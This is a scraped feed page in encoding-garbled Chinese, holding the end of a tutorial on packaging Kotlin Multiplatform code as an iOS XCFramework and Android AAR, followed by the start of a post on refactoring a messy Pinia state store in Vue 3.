<p><strong>Android Studioï¼š</strong> æœ€æ–°ç¨³å®šç‰ˆã€‚éœ€åœ¨ SDK Manager å®‰è£… <code>CMake</code> å’Œ <code>Command-line Tools</code>ã€‚</p>
</li>
<li>
<p><strong>Xcodeï¼š</strong> App Store ä¸‹è½½æœ€æ–°ç‰ˆï¼ˆä»…é™ Macï¼‰ã€‚å®‰è£…ååŠ¡å¿…æ‰§è¡Œï¼š</p>
<p>Bash</p>
<pre><code class="hljs language-csharp" lang="csharp">sudo xcode-<span class="hljs-keyword">select</span> -s /Applications/Xcode.app/Contents/Developer
</code></pre>
</li>
</ul>
<h3 data-id="heading-3">2. å¿«é€Ÿåˆ›å»ºé¡¹ç›®</h3>
<p>ä¸è¦æ‰‹åŠ¨å»é…ç½® Gradle æ–‡ä»¶ï¼Œé‚£æ˜¯å™©æ¢¦çš„å¼€å§‹ã€‚è¯·ç›´æ¥ä½¿ç”¨å®˜æ–¹å‘å¯¼ï¼š</p>
<ol>
<li>è®¿é—® <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fkmp.jetbrains.com%2F" target="_blank" title="https://kmp.jetbrains.com/" ref="nofollow noopener noreferrer">kmp.jetbrains.com</a></strong>ã€‚</li>
<li>å¡«å†™ Project IDã€‚</li>
<li><strong>iOS framework distribution</strong> é€‰æ‹© <code>Regular framework</code>ï¼ˆé€‚åˆæ‰‹åŠ¨é›†æˆï¼‰æˆ– <code>CocoaPods</code>ã€‚</li>
<li>ä¸‹è½½å¹¶è§£å‹ï¼Œä½¿ç”¨ Android Studio æ‰“å¼€ã€‚</li>
</ol>
<p><strong>é¿å‘æŒ‡å—ï¼š</strong> ç¬¬ä¸€æ¬¡æ‰“å¼€é¡¹ç›®ï¼ŒGradle Sync å¯èƒ½ä¼šè·‘å¾ˆä¹…ï¼Œè¯·ç¡®ä¿ç½‘ç»œé€šç•…ã€‚ç›´åˆ°å·¦ä¾§ Project è§†å›¾æ²¡æœ‰çº¢çº¿æŠ¥é”™ï¼Œæ‰ç®—æˆåŠŸã€‚</p>
<hr/>
<h2 data-id="heading-4">ç¬¬äºŒéƒ¨åˆ†ï¼šæ¶æ„è®¾è®¡ä¸å¹³å°å·®å¼‚åŒ–å¤„ç†</h2>
<p>è¿›å…¥å¼€å‘é˜¶æ®µï¼Œæœ€æ ¸å¿ƒçš„é—®é¢˜æ˜¯ï¼š<strong>ä»€ä¹ˆä»£ç å†™åœ¨å…¬ç”¨å±‚ï¼Œä»€ä¹ˆä»£ç éœ€è¦å•ç‹¬å†™ï¼Ÿ</strong></p>
<h3 data-id="heading-5">1. ä»£ç åˆ†å±‚ç­–ç•¥</h3>
<p>KMP é¡¹ç›®é€šå¸¸åŒ…å«ä¸‰ä¸ªæ ¸å¿ƒ SourceSetï¼š</p>
<ul>
<li><strong><code>commonMain</code> (90% ä»£ç )</strong> ï¼šä¸šåŠ¡é€»è¾‘ã€ç½‘ç»œè¯·æ±‚ (Ktor)ã€æ•°æ®åº“ (SQLDelight/Room)ã€é€šç”¨ UI (Compose Multiplatform)ã€‚</li>
<li><strong><code>androidMain</code></strong>ï¼šAndroid ç‰¹æœ‰å®ç°ã€‚</li>
<li><strong><code>iosMain</code></strong>ï¼šiOS ç‰¹æœ‰å®ç°ã€‚</li>
</ul>
<h3 data-id="heading-6">2. ä»€ä¹ˆæ—¶å€™éœ€è¦â€œå•ç‹¬å¤„ç†â€ï¼Ÿ</h3>
<p>åªè¦æ¶‰åŠ**â€œé—®æ“ä½œç³»ç»Ÿè¦æƒé™ã€è¦ç¡¬ä»¶ã€è¦ç‰¹å®šæœåŠ¡â€**çš„åœºæ™¯ï¼Œå°±éœ€è¦åˆ†ç¦»ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨ <code>expect</code> (å®šä¹‰æ¥å£) å’Œ <code>actual</code> (å¹³å°å®ç°) å…³é”®å­—ï¼š</p>



































<table><thead><tr><th><strong>åœºæ™¯</strong></th><th><strong>æ˜¯å¦éœ€è¦ç‹¬ç«‹å¤„ç†</strong></th><th><strong>è§£å†³æ–¹æ¡ˆ</strong></th></tr></thead><tbody><tr><td>çº¯ä¸šåŠ¡é€»è¾‘ / ViewModel</td><td>âŒ ä¸éœ€è¦</td><td>ç›´æ¥å†™åœ¨ commonMain</td></tr><tr><td>ç½‘ç»œè¯·æ±‚ / JSON è§£æ</td><td>âŒ ä¸éœ€è¦</td><td>ä½¿ç”¨ Ktor + Kotlinx.serialization</td></tr><tr><td><strong>ç›¸æœº / ç›¸å†Œ / è“ç‰™</strong></td><td>âœ… éœ€è¦</td><td>common å®šä¹‰æ¥å£ï¼Œå¹³å°ç«¯è°ƒç”¨ CameraX/AVFoundation</td></tr><tr><td><strong>WebView / åœ°å›¾</strong></td><td>âœ… éœ€è¦</td><td>CMP ä¸­ä½¿ç”¨ <code>AndroidView</code> å’Œ <code>UIKitView</code> äº’æ“ä½œ</td></tr><tr><td><strong>æ”¯ä»˜ SDK (å¾®ä¿¡/æ”¯ä»˜å®)</strong></td><td>âœ… éœ€è¦</td><td>å°è£…åŸç”Ÿ SDK çš„è°ƒç”¨æ¥å£</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-7">ç¬¬ä¸‰éƒ¨åˆ†ï¼šæ ¸å¿ƒå®æˆ˜â€”â€”æ„å»ºç»„ä»¶åŒ–äº§ç‰©</h2>
<p>è¿™æ˜¯æœ¬æ–‡çš„é‡ç‚¹ã€‚æˆ‘ä»¬éœ€è¦é…ç½® <code>build.gradle.kts</code>ï¼Œè®© KMP æ¨¡å—è‡ªåŠ¨ç”Ÿæˆ Android å’Œ iOS å¯ä»¥ç›´æ¥ä¾èµ–çš„äºŒè¿›åˆ¶åŒ…ã€‚</p>
<h3 data-id="heading-8">1. é…ç½® <code>shared/build.gradle.kts</code></h3>
<p>å°†ä»¥ä¸‹é…ç½®åº”ç”¨åˆ° KMP æ¨¡å—ä¸­ï¼š</p>
<p>Kotlin</p>
<pre><code class="hljs language-scss" lang="scss">plugins {
    <span class="hljs-built_in">alias</span>(libs.plugins.kotlinMultiplatform)
    <span class="hljs-built_in">alias</span>(libs.plugins.androidLibrary)
    `maven-publish` <span class="hljs-comment">// ç”¨äºå‘å¸ƒ AAR</span>
}

kotlin {
    androidTarget {
        <span class="hljs-built_in">publishLibraryVariants</span>("release", "debug") <span class="hljs-comment">// å…è®¸å‘å¸ƒ Android å˜ä½“</span>
        compilations<span class="hljs-selector-class">.all</span> {
            kotlinOptions { jvmTarget = "<span class="hljs-number">1.8</span>" }
        }
    }

    <span class="hljs-comment">// é…ç½® iOS XCFramework è¾“å‡º</span>
    val iosTargets = <span class="hljs-built_in">listOf</span>(iosX64(), <span class="hljs-built_in">iosArm64</span>(), <span class="hljs-built_in">iosSimulatorArm64</span>())
    iosTargets<span class="hljs-selector-class">.forEach</span> { iosTarget -&gt;
        iosTarget<span class="hljs-selector-class">.binaries</span><span class="hljs-selector-class">.framework</span> {
            baseName = "SharedSDK" <span class="hljs-comment">// iOS å¼•ç”¨æ—¶çš„æ¡†æ¶å</span>
            isStatic = true        <span class="hljs-comment">// å»ºè®®é™æ€åº“ï¼Œé›†æˆç®€å•</span>
        }
    }
    
    <span class="hljs-comment">// è‡ªåŠ¨æ³¨å†Œ XCFramework ä»»åŠ¡</span>
    val xcf = <span class="hljs-built_in">XCFramework</span>("SharedSDK")
    iosTargets<span class="hljs-selector-class">.forEach</span> {
        it<span class="hljs-selector-class">.binaries</span><span class="hljs-selector-class">.framework</span> { xcf<span class="hljs-selector-class">.add</span>(this) }
    }
    
    <span class="hljs-comment">// ... sourceSets é…ç½® ...</span>
}

<span class="hljs-comment">// é…ç½® Android Maven å‘å¸ƒ</span>
publishing {
    publications {
        create&lt;MavenPublication&gt;("mavenAndroid") {
            groupId = "com<span class="hljs-selector-class">.company</span><span class="hljs-selector-class">.kmp</span>"
            artifactId = "shared-sdk"
            version = "<span class="hljs-number">1.0</span><span class="hljs-selector-class">.0</span>"
            <span class="hljs-built_in">from</span>(components["release"])
        }
    }
}
</code></pre>
<h3 data-id="heading-9">2. ç”Ÿæˆäº§ç‰©</h3>
<p>ç”Ÿæˆ iOS XCFramework:</p>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p>
<p>Bash</p>
<pre><code class="hljs language-ruby" lang="ruby">./gradlew <span class="hljs-symbol">:shared</span><span class="hljs-symbol">:assembleSharedSDKXCFramework</span>
</code></pre>
<p><em>äº§ç‰©è·¯å¾„ï¼š</em> <code>shared/build/XCFrameworks/release/SharedSDK.xcframework</code></p>
<p>ç”Ÿæˆ Android AAR:</p>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p>
<p>Bash</p>
<pre><code class="hljs language-ruby" lang="ruby">./gradlew <span class="hljs-symbol">:shared</span><span class="hljs-symbol">:publishMavenAndroidPublicationToLocalRepoRepository</span>
<span class="hljs-comment"># æˆ–è€…ç›´æ¥æ‰“ release åŒ…</span>
./gradlew <span class="hljs-symbol">:shared</span><span class="hljs-symbol">:assembleRelease</span>
</code></pre>
<p><em>äº§ç‰©è·¯å¾„ï¼š</em> <code>shared/build/outputs/aar/shared-release.aar</code></p>
<hr/>
<h2 data-id="heading-10">ç¬¬å››éƒ¨åˆ†ï¼šåœ¨ç°æœ‰ App ä¸­é›†æˆ</h2>
<p>æ‹¿åˆ°äº§ç‰©åï¼ŒKMP é¡¹ç›®çš„ä½¿å‘½æš‚æ—¶å®Œæˆï¼Œæ¥ä¸‹æ¥æ˜¯åŸç”Ÿå›¢é˜Ÿçš„æ¥å…¥å·¥ä½œã€‚</p>
<h3 data-id="heading-11">Android ç«¯æ¥å…¥</h3>
<p>å°±åƒæ¥å…¥ä»»ä½•ç¬¬ä¸‰æ–¹åº“ä¸€æ ·ç®€å•ï¼š</p>
<p>Kotlin</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// app/build.gradle.kts</span>
dependencies {
    <span class="hljs-comment">// å¦‚æœå‘å¸ƒåˆ°äº† Maven ç§æœ</span>
    <span class="hljs-built_in">implementation</span>("com.company.kmp:shared-sdk:<span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>")
    <span class="hljs-comment">// æˆ–è€…ç›´æ¥å¼•ç”¨æœ¬åœ° AAR</span>
    <span class="hljs-built_in">implementation</span>(files("libs/shared-release.aar"))
}
</code></pre>
<h3 data-id="heading-12">iOS ç«¯æ¥å…¥</h3>
<ol>
<li>
<p>å°†ç”Ÿæˆçš„ <code>SharedSDK.xcframework</code> æ–‡ä»¶å¤¹æ‹–å…¥ Xcode å·¥ç¨‹ã€‚</p>
</li>
<li>
<p>åœ¨ <strong>General -&gt; Frameworks, Libraries, and Embedded Content</strong> ä¸­ï¼š</p>
<ul>
<li>å¦‚æœæ˜¯é™æ€åº“ (<code>isStatic = true</code>)ï¼šé€‰æ‹© <strong>Do Not Embed</strong>ã€‚</li>
<li>å¦‚æœæ˜¯åŠ¨æ€åº“ï¼šé€‰æ‹© <strong>Embed &amp; Sign</strong>ã€‚</li>
</ul>
</li>
<li>
<p>ä»£ç è°ƒç”¨ï¼š</p>
<p>Swift</p>
<pre><code class="hljs language-scss" lang="scss">import SharedSDK

<span class="hljs-comment">// è°ƒç”¨ KMP ä¸­çš„é€»è¾‘</span>
SharedSDK<span class="hljs-selector-class">.doSomething</span>()

<span class="hljs-comment">// å¦‚æœåŒ…å« Compose UI</span>
let vc = <span class="hljs-built_in">MainViewController</span>()
self<span class="hljs-selector-class">.present</span>(vc, animated: true)
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-13">ç»“è¯­</h2>
<p>é€šè¿‡è¿™ç§**â€œç»„ä»¶åŒ– + äºŒè¿›åˆ¶åˆ†å‘â€**çš„æ¨¡å¼ï¼Œæˆ‘ä»¬æˆåŠŸå°† KMP æŠ€æœ¯çš„å¼•å…¥é£é™©é™åˆ°äº†æœ€ä½ã€‚</p>
<ul>
<li><strong>å¯¹äºåŸç”Ÿå¼€å‘äººå‘˜ï¼š</strong> ä¸éœ€è¦å…³å¿ƒ KMP çš„æ„å»ºç»†èŠ‚ï¼Œåªéœ€è¦åƒä½¿ç”¨æ™®é€š SDK ä¸€æ ·ä½¿ç”¨å®ƒã€‚</li>
<li><strong>å¯¹äºæ¶æ„å¸ˆï¼š</strong> å¯ä»¥åœ¨æ–°ä¸šåŠ¡ä¸­å°è¯• KMPï¼ŒéªŒè¯æ•ˆç‡æå‡ï¼Œè€Œä¸ä¼šå½±å“ä¸» APP çš„ç¨³å®šæ€§ã€‚</li>
</ul>
<p>KMP ä¸æ˜¯è¦å–ä»£è°ï¼Œè€Œæ˜¯è¦æˆä¸ºè¿æ¥ Android å’Œ iOS ç”Ÿæ€çš„æ¡¥æ¢ã€‚ç°åœ¨ï¼Œå°±å¼€å§‹å¢é‡è¿ç§»ä¹‹æ—…å§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘æ˜¯å¦‚ä½•æ²»ç†ä¸€ä¸ªæ··ä¹±çš„ Pinia çŠ¶æ€ç®¡ç†ç³»ç»Ÿçš„]]></title>    <link>https://juejin.cn/post/7581036773607391232</link>    <guid>https://juejin.cn/post/7581036773607391232</guid>    <pubDate>2025-12-08T04:20:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581036773607391232" data-draft-id="7580988382761041935" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘æ˜¯å¦‚ä½•æ²»ç†ä¸€ä¸ªæ··ä¹±çš„ Pinia çŠ¶æ€ç®¡ç†ç³»ç»Ÿçš„"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-08T04:20:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§è±¡çš„é¼»å­é‚£ä¹ˆé•¿"/> <meta itemprop="url" content="https://juejin.cn/user/2277843821926871"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘æ˜¯å¦‚ä½•æ²»ç†ä¸€ä¸ªæ··ä¹±çš„ Pinia çŠ¶æ€ç®¡ç†ç³»ç»Ÿçš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2277843821926871/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§è±¡çš„é¼»å­é‚£ä¹ˆé•¿
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.4 èä¼šè´¯é€š
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.4 èä¼šè´¯é€š" title="VIP.4 èä¼šè´¯é€š" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:20:15.000Z" title="Mon Dec 08 2025 04:20:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ€è¿‘æ¥æ‰‹äº†ä¸€ä¸ª Vue 3 + TypeScript çš„ä¸­å¤§å‹é¡¹ç›®ï¼ŒçŠ¶æ€ç®¡ç†è¿™å—â€¦æ€ä¹ˆè¯´å‘¢ï¼Œä¸€è¨€éš¾å°½ã€‚èŠ±äº†ä¸¤å‘¨æ—¶é—´åšäº†ä¸€æ¬¡ç³»ç»Ÿæ€§çš„æ²»ç†ï¼Œè¸©äº†ä¸å°‘å‘ï¼Œä¹Ÿæ€»ç»“å‡ºä¸€äº›ç»éªŒï¼Œåˆ†äº«ç»™åŒæ ·åœ¨"å±å±±"ä¸­æŒ£æ‰çš„æœ‹å‹ä»¬ã€‚</p>
</blockquote>
<h2 data-id="heading-0">èƒŒæ™¯ï¼šæ¥æ‰‹æ—¶çš„çŠ¶å†µ</h2>
<p>é¡¹ç›®ç”¨çš„æ˜¯ Piniaï¼Œä½†æ‰“å¼€ <code>src/store</code> ç›®å½•çš„é‚£ä¸€åˆ»ï¼Œæˆ‘æ²‰é»˜äº†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">src/store/
â”œâ”€â”€ index.ts
â”œâ”€â”€ user.ts               <span class="hljs-comment"># Options API é£æ ¼</span>
â”œâ”€â”€ system.ts             <span class="hljs-comment"># Options API é£æ ¼</span>
â”œâ”€â”€ loading.ts            <span class="hljs-comment"># åŠæˆå“</span>
â”œâ”€â”€ keepAlive.ts          <span class="hljs-comment"># æ²¡æœ‰ç±»å‹</span>
â”œâ”€â”€ point-to-point.ts     <span class="hljs-comment"># Setup é£æ ¼ + å•¥éƒ½å¾€é‡Œå¡</span>
â”œâ”€â”€ selection.ts          <span class="hljs-comment"># ä¸çŸ¥é“å¹²å˜›çš„</span>
â”œâ”€â”€ xxx-name.ts           <span class="hljs-comment"># å¥½å‡ ä¸ªç±»ä¼¼çš„æ–‡ä»¶</span>
â””â”€â”€ ...è¿˜æœ‰ä¸€å †
</code></pre>
<p>åå‡ ä¸ª Store æ–‡ä»¶æ‰å¹³åœ°å †åœ¨ä¸€èµ·ï¼Œæœ‰çš„ç”¨ Options APIï¼Œæœ‰çš„ç”¨ Setup é£æ ¼ï¼Œæœ‰çš„ç”¨ TypeScriptï¼Œæœ‰çš„æ»¡å± <code>any</code>ã€‚æ›´ç¦»è°±çš„æ˜¯ï¼Œ<code>composables</code> ç›®å½•é‡Œä¹Ÿæœ‰ä¸€å¥—"çŠ¶æ€ç®¡ç†"ï¼Œä¸¤è¾¹åŠŸèƒ½é‡å ï¼Œè°ä¹Ÿä¸çŸ¥é“è¯¥ç”¨å“ªä¸ªã€‚</p>
<h2 data-id="heading-1">é—®é¢˜è¯Šæ–­ï¼šåˆ°åº•å“ªå‡ºäº†é—®é¢˜</h2>
<p>åœ¨åŠ¨æ‰‹ä¹‹å‰ï¼Œæˆ‘èŠ±äº†åŠå¤©æ—¶é—´æ¢³ç†ï¼ŒæŠŠé—®é¢˜åˆ†æˆäº†ä¸‰ä¸ªç­‰çº§ã€‚</p>
<h3 data-id="heading-2">P0 - ä¸æ²»ä¸è¡Œ</h3>
<p><strong>1. ä»£ç é£æ ¼ç²¾ç¥åˆ†è£‚</strong></p>
<p>ä¸€åŠ Options APIï¼Œä¸€åŠ Setup é£æ ¼ã€‚Options API æ˜¯ Vue 2 æ—¶ä»£çš„å†™æ³•ï¼Œåœ¨ Vue 3 + TypeScript é¡¹ç›®é‡Œç”¨è¿™ä¸ªï¼Œç±»å‹æ¨æ–­å¾ˆéš¾å—ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ—§ä»£ç ï¼šOptions API</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'user'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">userInfo</span>: <span class="hljs-literal">null</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>,  <span class="hljs-comment">// åˆ°å¤„éƒ½æ˜¯ any</span>
    <span class="hljs-attr">permissions</span>: [] <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>[],
  }),
  <span class="hljs-attr">getters</span>: {
    <span class="hljs-attr">getLocale</span>: <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">locale</span>,  <span class="hljs-comment">// è¿™ç§ getter æ¯«æ— æ„ä¹‰</span>
  },
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-title function_">setUserInfoAction</span>(<span class="hljs-params">info</span>) {  <span class="hljs-comment">// Action åç¼€æ˜¯ä»€ä¹ˆé¬¼</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">userInfo</span> = info
    },
  },
})
</code></pre>
<p><strong>2. ç±»å‹å½¢åŒè™šè®¾</strong></p>
<p><code>as any</code>ã€<code>as any[]</code> æ»¡å¤©é£ï¼ŒTypeScript æˆäº†æ‘†è®¾ã€‚æœ‰äº›å¤æ‚å¯¹è±¡å®Œå…¨æ²¡æœ‰ç±»å‹å®šä¹‰ï¼Œå…¨é  IDE çŒœã€‚</p>
<p><strong>3. èŒè´£è¾¹ç•Œæ¨¡ç³Š</strong></p>
<p>æœ‰ä¸ªå« <code>point-to-point.ts</code> çš„æ–‡ä»¶ï¼Œé‡Œé¢å¡äº†ï¼šè¡¨å•çŠ¶æ€ã€å­—å…¸æ•°æ®ã€ä¸‹æ‹‰é€‰é¡¹ã€é€‰ä¸­é¡¹ç®¡ç†ã€ç”šè‡³è¿˜æœ‰ä¸€äº›å·¥å…·å‡½æ•°ã€‚500 å¤šè¡Œï¼Œè°éƒ½ä¸æ•¢åŠ¨ã€‚</p>
<h3 data-id="heading-3">P1 - è¿Ÿæ—©è¦æ”¹</h3>
<ul>
<li><strong>å‘½åé£æ ¼ä¸ç»Ÿä¸€</strong>ï¼š<code>point-to-point</code>ã€<code>appSystem</code>ã€<code>admin_user</code>ï¼Œä¸‰ç§å‘½åæ³•é½æ´»</li>
<li><strong>æŒä¹…åŒ–ç­–ç•¥æ··ä¹±</strong>ï¼šæœ‰çš„ç”¨ <code>localStorage</code>ï¼Œæœ‰çš„ç”¨ <code>sessionStorage</code>ï¼Œæœ‰çš„æ ¹æœ¬æ²¡åšæŒä¹…åŒ–ä½†æ•°æ®åˆ·æ–°å°±ä¸¢</li>
<li><strong>ç¼“å­˜é€»è¾‘é‡å¤</strong>ï¼šå¥½å‡ ä¸ª Store éƒ½è‡ªå·±å®ç°äº†ä¸€å¥—"å¸¦è¿‡æœŸæ—¶é—´çš„ç¼“å­˜"ï¼Œä»£ç å‡ ä¹ä¸€æ ·</li>
</ul>
<h3 data-id="heading-4">P2 - ä»£ç æ´ç™–</h3>
<ul>
<li>Getter åªæ˜¯ç®€å•è¿”å› stateï¼Œå®Œå…¨å¤šä½™</li>
<li>Action å‘½åå¸¦ <code>Action</code> åç¼€ï¼Œä¸ç¬¦åˆç¤¾åŒºä¹ æƒ¯</li>
<li>æ³¨é‡Šç¼ºå¤±ï¼Œä¸‰ä¸ªæœˆåè‡ªå·±éƒ½çœ‹ä¸æ‡‚</li>
</ul>
<h2 data-id="heading-5">è§£å†³æ–¹æ¡ˆï¼šæ€ä¹ˆæ²»</h2>
<h3 data-id="heading-6">ä¸€ã€æŒ‰ä¸šåŠ¡åŸŸç»„ç»‡ç›®å½•</h3>
<p>æ‰å¹³ç»“æ„æœ€å¤§çš„é—®é¢˜æ˜¯ï¼šé¡¹ç›®ä¸€å¤§ï¼Œæ‰¾æ–‡ä»¶å…¨é æœç´¢ã€‚</p>
<p>é‡æ„åçš„ç›®å½•ç»“æ„æŒ‰ä¸šåŠ¡åŸŸåˆ’åˆ†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">src/store/
â”œâ”€â”€ index.ts              <span class="hljs-comment"># ç»Ÿä¸€å¯¼å‡º</span>
â”œâ”€â”€ core/                 <span class="hljs-comment"># æ ¸å¿ƒåŸŸï¼šç”¨æˆ·ã€ç³»ç»Ÿã€åŠ è½½çŠ¶æ€</span>
â”‚   â”œâ”€â”€ index.ts
â”‚   â”œâ”€â”€ user.ts
